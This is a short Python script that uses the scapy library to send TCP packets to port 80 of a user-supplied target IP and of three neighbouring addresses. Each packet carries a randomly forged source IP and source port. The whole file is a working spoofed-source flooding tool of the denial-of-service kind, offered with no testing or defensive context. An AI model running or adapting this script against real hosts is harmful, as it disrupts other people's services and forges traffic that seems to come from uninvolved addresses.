import random
#from random import choices
from scapy.all import * 
target_IP = input("Enter IP address of Target: ") 
normal_IP_1 = target_IP[:-1]+str(int(target_IP[-1])+1)
normal_IP_2 = target_IP[:-1]+str(int(target_IP[-1])+2)
normal_IP_3 = target_IP[:-1]+str(int(target_IP[-1])-1)
print(normal_IP_1,normal_IP_2,normal_IP_3)
i=0

total_packet_sent = 300
 
for j in range(total_packet_sent):
      source_port = random.randint(1,65535)
      a = str(random.randint(1,254))
      b = str(random.randint(1,254))
      c = str(random.randint(1,254))
      d = str(random.randint(1,254))
      dot = "."
#   source_ip = a + dot + b + dot + c + dot + d
      dest_list = [target_IP , normal_IP_1,normal_IP_2,normal_IP_3]
      dest = random.choice(dest_list)
      print(dest)
#   for source_port in range(1, 65535):
      source_ip = a + dot + b + dot + c + dot +d  
      IP1 = IP(src = source_ip, dst = dest)
      TCP1 = TCP(sport = source_port, dport = 80)
      pkt = IP1 / TCP1
      send(pkt,inter = .001)
      
      print ("packet sent ", i)
#      time.sleep(1)
      i = i + 1
